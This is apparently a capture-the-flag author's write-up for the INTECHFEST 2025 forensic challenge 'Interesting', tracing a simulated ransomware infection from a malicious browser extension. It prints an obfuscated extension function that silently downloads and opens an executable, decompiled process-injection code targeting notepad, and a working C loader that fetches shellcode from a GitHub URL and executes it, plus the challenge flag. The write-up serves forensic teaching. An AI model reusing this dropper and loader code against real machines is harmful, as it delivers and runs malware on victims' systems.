---
title: "Chrome Extension Forensic and Harmful Shellcode Simulation - INTECHFEST 2025"
pubDate: "2025-11-22"
description: 'This is the proof of concept of "Interesting", the challenge which i created for INTECHFEST 2025'
---

## Interesting - INTECHFEST 2025
### This is the proof of concept of "Interesting", the challenge which i created for INTECHFEST 2025

> tags: Forensic, Ransomware, Windows Shellcode, Obfuscated, Dynamic Analysis, Simulation, Browser, Cache, Disk

> difficulty: ?/10

Description: 
Yesterday started like any other day, just casually browsing the internet. That was until I stumbled upon something... **interesting**. I’m not exactly sure what it was, but soon after, my files became inaccessible.

Panicking, I remembered what a friend (he is Chizuru's Fiancée) once told me: "If you ever find suspicious files, make sure to permanently delete them."

So I did. I deleted everything that looked even remotely suspicious.
No backups, no analysis, just gone.

Now I regret it deeply. Maybe if I had taken the time to investigate, there would’ve been a way to access my files again. But now all I have is a mystery... and a mess.

Can you figure out what happened and uncover what I destroyed?

Distribution File: https://drive.google.com/file/d/1_hLFEUsJzX8PndwJr8NPYIWt8xXC8wEb/view?usp=sharing

Password: `62339f4615a5eda78085af3234179d39e66fe949b7681370cc18757c149445d9`

### Proof-of-Concept
Given the AD1 distribution file, this challenge is intended to be a straightforward challenge.

![image](/images-interesting/dist.png)

You can directly analyze the user's data, especially the browser, since the description already told you that he was casually browsing the internet.

![image](/images-interesting/browser-history.png)

Notice that the user is downloading some kind of browser extension, it could be the entry point of the attack.

You can't access the Google Drive (this is intended).

![image](/images-interesting/drive.png)

Try another way.

You must notice that there is INDX file of deleted RunMe.exe
![image](/images-interesting/runme.png)

consider this as a hint that the user must be run this file from the extension.

Browser extensions sometimes cache JavaScript that runs in the browser. This cache is stored in `\AppData\Local\Microsoft\Edge\User Data\Default\Service Worker\ScriptCache`

![image](/images-interesting/cached-js.png)

in that cached js, there is a malicious IntroOnLoad() function that triggered after the extension is installed.

```js
async function IntroOnLoad() {
  try {
    const _0x1b8a4e = [104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 107, 101, 110, 115, 104, 105, 57, 57, 121, 47, 105, 109, 97, 103, 101, 45, 100, 111, 119, 110, 108, 111, 97, 100, 101, 114, 47, 114, 97, 119, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 82, 117, 110, 77, 101, 46, 101, 120, 101];
    const _0x5a3c1b = String.fromCharCode(..._0x1b8a4e);
    
    const _0x3e8f7c = [82, 117, 110, 77, 101];
    const _0x2d8e4f = String.fromCharCode(..._0x3e8f7c);

    const _0x1f9a8c = [101, 101, 102, 117, 102, 115, 115, 120, 101, 101, 95, 95, 97, 111, 48, 110, 51, 95, 51, 110, 115, 98, 108, 97, 111, 102, 98, 49, 114, 50, 125, 48, 51, 100, 99, 116, 95, 115, 117, 48, 56, 110];
    const _0x4b7d2e = [1, 39, 31, 7, 11, 26, 15, 18, 5, 30, 9, 27, 35, 10, 28, 21, 36, 16, 17, 25, 14, 0, 8, 3, 24, 6, 34, 23, 4, 37, 41, 38, 20, 32, 2, 19, 12, 13, 33, 29, 40, 22];
    const _0x3c6a5d = new Array(_0x1f9a8c.length);
    for (let i = 0; i < _0x1f9a8c.length; i++) {
        _0x3c6a5d[_0x4b7d2e[i]] = _0x1f9a8c[i];
    }
    const asfgaerta3asdsa = String.fromCharCode(..._0x3c6a5d);

    chrome.downloads.download({
      url: _0x5a3c1b,
      filename: _0x2d8e4f,
      saveAs: false
    }, (downloadId) => {
      if (chrome.runtime.lastError) {
        return;
      }
      const downloadListener = (delta) => {
        if (delta.id === downloadId && delta.state && delta.state.current === 'complete') {
          chrome.downloads.open(downloadId, () => {
            if (chrome.runtime.lastError) {
              return;
            }
          });
          chrome.downloads.onChanged.removeListener(downloadListener);
        }
      };
      chrome.downloads.onChanged.addListener(downloadListener);
    });
  } catch (error) {
    // Error handling removed as per instruction
  }
}
```

the function proceed to download some file (probably the deleted RunMe.exe) and some obfuscated variable exist.

```js
    const _0x1f9a8c = [101, 101, 102, 117, 102, 115, 115, 120, 101, 101, 95, 95, 97, 111, 48, 110, 51, 95, 51, 110, 115, 98, 108, 97, 111, 102, 98, 49, 114, 50, 125, 48, 51, 100, 99, 116, 95, 115, 117, 48, 56, 110];
    const _0x4b7d2e = [1, 39, 31, 7, 11, 26, 15, 18, 5, 30, 9, 27, 35, 10, 28, 21, 36, 16, 17, 25, 14, 0, 8, 3, 24, 6, 34, 23, 4, 37, 41, 38, 20, 32, 2, 19, 12, 13, 33, 29, 40, 22];
    const _0x3c6a5d = new Array(_0x1f9a8c.length);
    for (let i = 0; i < _0x1f9a8c.length; i++) {
        _0x3c6a5d[_0x4b7d2e[i]] = _0x1f9a8c[i];
    }
    const asfgaerta3asdsa = String.fromCharCode(..._0x3c6a5d);
```

if you print the asfgaerta3asdsa, the result of that obfuscated variable is the 2nd part of the flag

and the download function is pointing to https://github.com/kenshi99y/image-downloader/raw/refs/heads/main/RunMe.exe

you can download the RunMe.exe again to analyze it.
Decompile the RunMe and you will notice that this is the loader not the real malware. it will download a file using
```C
  uVar2 = URLDownloadToFileA((LPUNKNOWN)0x0,
                                 "https://github.com/jonscafe/pengujianpl/raw/refs/heads/main/pert2/driv erw.sys"
                                 ,(LPCSTR)local_138,0,(LPBINDSTATUSCALLBACK)0x0);
```

and proceed it as a shellcode using NtCreateSection and NtMapViewOfSection

these payload decryption process is a decoy.
```C
void decryptPayload(longlong param_1,ulonglong param_2)

{
  undefined8 local_10;
  
  for (local_10 = 0; local_10 < param_2; local_10 = local_10 + 1) {
    *(byte *)(local_10 + param_1) = *(byte *)(local_10 + param_1) ^ 0xff;
  }
  return;
}
```

this function will load the shellcode with notepad as a shadow process

```C
  hModule = GetModuleHandleA("ntdll.dll");
  pFVar8 = GetProcAddress(hModule,"NtCreateSection");
  pFVar9 = GetProcAddress(hModule,"NtMapViewOfSection");
  if ((pFVar8 == (FARPROC)0x0) || (pFVar9 == (FARPROC)0x0)) {
    DVar1 = GetLastError();
    pFVar5 = (FILE *)__acrt_iob_func(2);
    FUN_140002580(pFVar5,"Error getting NT API function pointers: %lu\n",(ulonglong)DVar1,pFVar17);
    free(_DstBuf);
  }
  else {
    uVar16 = 0;
    local_2b8.cb = 0x68;
    p_Var13 = &local_2d8;
    for (lVar11 = 6; lVar11 != 0; lVar11 = lVar11 + -1) {
      *(undefined4 *)&p_Var13->hProcess = 0;
      p_Var13 = (_PROCESS_INFORMATION *)((longlong)&p_Var13->hProcess + 4);
    }
    lVar11 = 0x19;
    builtin_memcpy(local_2e4 + 8,"exe",4);
    puVar14 = (undefined4 *)&local_2b8.field_0x4;
    for (; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar14 = 0;
      puVar14 = puVar14 + 1;
    }
    builtin_memcpy(local_2e4,"notepad.",8);
    lpProcessInformation = &local_2d8;
    lpStartupInfo = &local_2b8;
    uVar23 = 0;
    BVar4 = CreateProcessA((LPCSTR)0x0,local_2e4,(LPSECURITY_ATTRIBUTES)0x0,
                              (LPSECURITY_ATTRIBUTES)0x0,0,4,(LPVOID)0x0,(LPCSTR)0x0,lpStartupInfo,
                              lpProcessInformation);
    uVar24 = (undefined4)((ulonglong)lpProcessInformation >> 0x20);
    if (BVar4 == 0) {
      DVar1 = GetLastError();
      pFVar5 = (FILE *)__acrt_iob_func(2);
      FUN_140002580(pFVar5,"CreateProcess failed: %lu\n",(ulonglong)DVar1,uVar16);
      free(_DstBuf);
    }
    else {
      local_310 = (HANDLE)0x0;
      psVar18 = &local_308;
      local_308 = _Size;
      uVar10 = (*pFVar8)(&local_310,0xf001f,0,psVar18,CONCAT44(uVar21,0x40),
                            CONCAT44(uVar22,0x8000000),0);
      if ((int)uVar10 == 0) {
         local_300 = (LPTHREAD_START_ROUTINE)0x0;
         local_2f8 = 0;
         ppPVar15 = &local_300;
         sVar19 = 0;
         uVar10 = (*pFVar9)(local_310,local_2d8.hProcess,ppPVar15,0,0,0,&local_2f8,CONCAT44(uVar23,2)
                              ,(ulonglong)lpStartupInfo & 0xffffffff00000000,CONCAT44(uVar24,0x40));
         if ((int)uVar10 == 0) {
           FUN_140004ec0("process at %p\n",(ulonglong)local_300,ppPVar15,sVar19);
           sVar19 = _Size;
           BVar4 = WriteProcessMemory(local_2d8.hProcess,local_300,_DstBuf,_Size,&local_2f0);
           if ((BVar4 != 0) && (local_2f0 == _Size)) {
             free(_DstBuf);
             pPVar20 = local_300;
             hHandle = CreateRemoteThread(local_2d8.hProcess,(LPSECURITY_ATTRIBUTES)0x0,0,local_300,
                                              (LPVOID)0x0,0,(LPDWORD)0x0);
             if (hHandle == (HANDLE)0x0) {
                DVar1 = GetLastError();
                pFVar5 = (FILE *)__acrt_iob_func(2);
                FUN_140002580(pFVar5,"CreateRemoteThread failed: %lu\n",(ulonglong)DVar1,pPVar20);
                CloseHandle(local_310);
                TerminateProcess(local_2d8.hProcess,1);
                return 1;
             }
             ResumeThread(local_2d8.hThread);
             WaitForSingleObject(hHandle,0xffffffff);
             CloseHandle(hHandle);
             CloseHandle(local_2d8.hProcess);
             CloseHandle(local_2d8.hThread);
             CloseHandle(local_310);
             return uVar10 & 0xffffffff;
           }
           DVar1 = GetLastError();
           pFVar5 = (FILE *)__acrt_iob_func(2);
           uVar10 = (ulonglong)DVar1;
           pcVar12 = "WriteProcessMemory failed: %lu\n";
         }
         else {
           pFVar5 = (FILE *)__acrt_iob_func(2);
           uVar10 = uVar10 & 0xffffffff;
           pcVar12 = "NtMapViewOfSection failed: 0x%lX\n";
         }
         FUN_140002580(pFVar5,pcVar12,uVar10,sVar19);
         CloseHandle(local_310);
      }
      else {
         pFVar5 = (FILE *)__acrt_iob_func(2);
         FUN_140002580(pFVar5,"NtCreateSection failed: 0x%lX\n",uVar10 & 0xffffffff,psVar18);
      }
      TerminateProcess(local_2d8.hProcess,1);
      free(_DstBuf);
    }
  }
```

download the https://github.com/jonscafe/pengujianpl/raw/refs/heads/main/pert2/driverw.sys 

the sys extension is a decoy. its not really a sys driver file. its a shellcode. you need to analyze the shellcode but the size is too big and it becoming too complex to analyze, at least for me.

the intended solution is by simulating the malware.
you just need to run the RunMe.exe on a safe sandbox environment and analyze the process.

But because the "driver" file in the repo is moved, you cant download-in, hence the loader will fail to load the sys file, the current RunMe.exe wont work.

So you need to write your own shellcode loader to load the "driverw.sys".

```c
// loader example, loader.c
#include <windows.h>
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")

int main() {
    char tempPath[MAX_PATH];
    char filePath[MAX_PATH];
    DWORD tempPathLen = GetTempPathA(MAX_PATH, tempPath);

    if (tempPathLen == 0 || tempPathLen > MAX_PATH) {
        fprintf(stderr, "Failed to get TEMP path\n");
        return 1;
    }

    snprintf(filePath, MAX_PATH, "%sdriverw.sys", tempPath);

    HRESULT hr = URLDownloadToFileA(NULL,
        "https://github.com/jonscafe/pengujianpl/raw/refs/heads/main/pert2/driverw.sys",
        filePath, 0, NULL);

    if (FAILED(hr)) {
        fprintf(stderr, "Download failed: 0x%08lx\n", hr);
        return 1;
    }

    FILE *fp = fopen(filePath, "rb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    rewind(fp);

    unsigned char *shellcode = (unsigned char *)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {
        fprintf(stderr, "VirtualAlloc failed\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, size, fp);
    fclose(fp);

    ((void(*)())shellcode)();

    return 0;
}
```

Here, in this PoC i use wireshark to analyze the network traffic. you can also use SysMon or APIMonitor, its depends on you.

just dumping the .sys into site like VirusTotal wont give you anything, since they cant run the shellcode directly, you need to write your own loader. (should be, i dont know if there was any unintended solution)

if you capture the network traffic when the loader of the sys file is being run. there is some network activity that accessing pastebin

![image](/images-interesting/wiresharkdump.png)

you can open those pastebin sus network traffic

![image](/images-interesting/pastebin.png)

after knowing what encryption method is used and the encryption key. now you can decrypt the 'My Precious Resume' file which contains the 1st flag.

1st part of the flag:
![image](/images-interesting/flag.png)

flag:
INTECHFEST{imo_f0r3n51c_is_about_dynamic_4n4lys1s_and_becareful_of_sss_3xt3nn1ons_00efduba320e8}
